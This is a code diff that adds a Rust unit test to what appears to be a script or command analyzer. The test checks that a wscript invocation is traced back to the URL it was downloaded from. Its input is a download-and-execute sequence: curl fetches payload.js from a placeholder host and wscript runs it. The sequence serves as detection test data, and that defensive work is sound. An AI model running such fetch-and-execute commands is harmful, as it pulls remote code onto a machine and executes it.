@@ -10965,6 +10965,27 @@ mod cscript_tests {
     }
 
     #[test]
+    fn wscript_current_dir_js_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o payload.js https://wscript-dot-source.example/payload.js
+wscript .\payload.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"wscript .\payload.js"#
+                            && url == "https://wscript-dot-source.example/payload.js"
+                )
+            }),
+            "wscript current-directory script target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn wscript_current_dir_nested_js_does_not_use_unrelated_basename_content() {
         let mut env = Environment::new(&Config::default());
         let js_content = b"WScript.Echo('wrong')\r\n".to_vec();
